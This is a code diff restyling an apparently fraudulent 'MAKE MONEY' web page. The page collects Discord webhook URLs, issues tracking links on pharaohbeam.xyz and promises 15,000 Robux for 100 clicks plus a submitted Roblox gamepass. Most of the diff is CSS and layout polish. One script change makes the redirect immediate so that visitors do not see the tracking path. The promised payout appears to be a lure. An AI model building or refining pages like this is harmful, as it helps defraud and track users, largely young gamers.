@@ -14,7 +14,8 @@
             --dark-black: #000000;
             --white: #FFFFFF;
             --gray: #AAAAAA;
-            --dark-red: #8B0000;
+            --dark-red: #6B0000;
+            --medium-red: #8B0000;
             --bright-red: #FF0000;
             --light-red: #FF3333;
             --neon-red: #ff073a;
@@ -62,9 +63,31 @@
             z-index: 2;
         }
         
-        header {
-            text-align: center;
-            margin-bottom: 2rem;
+        .main-card {
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(8px);
+            border-radius: 1rem;
+            border: 1px solid var(--bright-red);
+            box-shadow: 0 8px 32px rgba(139, 0, 0, 0.3);
+            overflow: hidden;
+        }
+        
+        .card-section {
+            padding: 2rem;
+            background: var(--dark-red);
+            border-bottom: 1px solid var(--bright-red);
+        }
+        
+        .card-section:last-child {
+            border-bottom: none;
+        }
+        
+        .card-section.lighter {
+            background: var(--medium-red);
+        }
+        
+        .card-section.lightest {
+            background: var(--dark-red);
         }
         
         .page-title {
@@ -74,13 +97,15 @@
             color: var(--white);
             text-shadow: 0 0 10px var(--bright-red), 0 0 20px var(--bright-red);
             margin-bottom: 0.5rem;
+            text-align: center;
         }
         
         .page-subtitle {
             font-family: 'Rajdhani', sans-serif;
             font-size: 1.2rem;
             color: var(--white);
-            margin-bottom: 2rem;
+            margin-bottom: 1rem;
+            text-align: center;
         }
         
         .home-btn {
@@ -94,29 +119,21 @@
             text-decoration: none;
             font-family: 'Orbitron', sans-serif;
             transition: all 0.3s ease;
+            border: 1px solid var(--bright-red);
         }
         
         .home-btn:hover {
             background: var(--bright-red);
         }
         
-        .card {
-            background: rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(8px);
-            border-radius: 1rem;
-            padding: 2rem;
-            margin-bottom: 2rem;
-            border: 1px solid var(--bright-red);
-            box-shadow: 0 8px 32px rgba(139, 0, 0, 0.3);
-        }
-        
-        .card-title {
+        .section-title {
             font-size: 1.5rem;
             font-weight: 600;
             color: var(--white);
             text-shadow: 0 0 8px var(--bright-red);
             margin-bottom: 1.5rem;
             font-family: 'Orbitron', sans-serif;
+            text-align: center;
         }
         
         .form-group {
@@ -126,7 +143,7 @@
         .form-group label {
             display: block;
             margin-bottom: 0.5rem;
-            color: var(--bright-red);
+            color: var(--white);
             font-weight: 600;
         }
         
@@ -187,12 +204,17 @@
         
         .link-display {
             word-break: break-all;
-            background: rgba(139, 0, 0, 0.3);
+            background: rgba(0, 0, 0, 0.3);
             padding: 1rem;
             border-radius: 0.5rem;
-            margin: 1rem 0;
+            margin: 0 auto;
             border: 1px dashed var(--bright-red);
             font-family: monospace;
+            text-align: center;
+            width: 100%;
+            max-width: 100%;
+            display: block;
+            overflow-wrap: anywhere;
         }
         
         .success-message {
@@ -213,6 +235,7 @@
             color: var(--gray);
             font-size: 0.9rem;
             margin-top: 0.5rem;
+            text-align: center;
         }
         
         .footer-note {
@@ -243,6 +266,10 @@
                 margin-bottom: 1rem;
                 display: inline-block;
             }
+            
+            .card-section {
+                padding: 1.5rem;
+            }
         }
     </style>
 </head>
@@ -254,14 +281,15 @@
             <i class="fas fa-home"></i> Home
         </a>
         
-        <header>
-            <h1 class="page-title">MAKE MONEY</h1>
-            <p class="page-subtitle">Generate your own link, share it, and earn 15,000 Robux when you reach 100 clicks!</p>
-        </header>
-        
-        <main>
-            <!-- Initial Form Card -->
-            <div class="card" id="initial-card">
+        <div class="main-card">
+            <!-- Header Card Section -->
+            <div class="card-section">
+                <h1 class="page-title">MAKE MONEY</h1>
+                <p class="page-subtitle">Generate your own link, share it, and earn 15,000 Robux when you reach 100 clicks!</p>
+            </div>
+            
+            <!-- Initial Form Card Section -->
+            <div class="card-section lighter" id="initial-card">
                 <div class="form-group">
                     <label for="webhook-url">Your Discord Webhook Url</label>
                     <input type="text" id="webhook-url" class="form-control" placeholder="https://discord.com/api/webhooks/...">
@@ -275,21 +303,21 @@
                 <div id="webhook-error" class="error-message hidden"></div>
             </div>
             
-            <!-- Generated Link Card (hidden by default) -->
-            <div class="card hidden" id="link-card">
-                <h2 class="card-title">Your Link is Ready!</h2>
-                <div class="input-group">
+            <!-- Generated Link Card Section -->
+            <div class="card-section lightest hidden" id="link-card">
+                <h2 class="section-title">Your Link is Ready!</h2>
+                <div class="input-group" style="flex-direction: column;">
                     <div class="link-display" id="generated-link">https://pharaohbeam.xyz/loading...</div>
-                    <button id="copy-btn" class="btn btn-copy" title="Copy to clipboard">
-                        <i class="fas fa-copy"></i>
+                    <button id="copy-btn" class="btn btn-copy" title="Copy to clipboard" style="margin-top: 1rem;">
+                        <i class="fas fa-copy"></i> COPY LINK
                     </button>
                 </div>
             </div>
             
-            <!-- Gamepass Submission Card (hidden by default) -->
-            <div class="card hidden" id="gamepass-card">
-                <h2 class="card-title">SUBMIT YOUR GAMEPASS</h2>
-                <p>Create a Roblox gamepass for 6000-8000 Robux and submit the link below. We'll automatically purchase it when you reach 100 clicks!</p>
+            <!-- Gamepass Submission Card Section -->
+            <div class="card-section lighter hidden" id="gamepass-card">
+                <h2 class="section-title">SUBMIT YOUR GAMEPASS</h2>
+                <p style="text-align: center; margin-bottom: 1rem;">Create a Roblox gamepass for 6000-8000 Robux and submit the link below. We'll automatically purchase it when you reach 100 clicks!</p>
                 
                 <div class="form-group">
                     <input type="text" id="gamepass-url" class="form-control" placeholder="https://www.roblox.com/game-pass/...">
@@ -304,7 +332,7 @@
                 
                 <p class="footer-note">If you have any issues, contact <a href="https://discord.gg/phar" style="color: var(--bright-red);">https://discord.gg/phar</a> on Discord.</p>
             </div>
-        </main>
+        </div>
     </div>
 
     <script>
@@ -569,10 +597,8 @@
                     }
                 }
                 
-                // Redirect after handling
-                setTimeout(() => {
-                    window.location.href = BASE_URL;
-                }, 1000);
+                // Redirect to homepage without showing the path
+                window.location.href = BASE_URL;
             } else {
                 // Invalid link ID, redirect to home
                 window.location.href = BASE_URL;
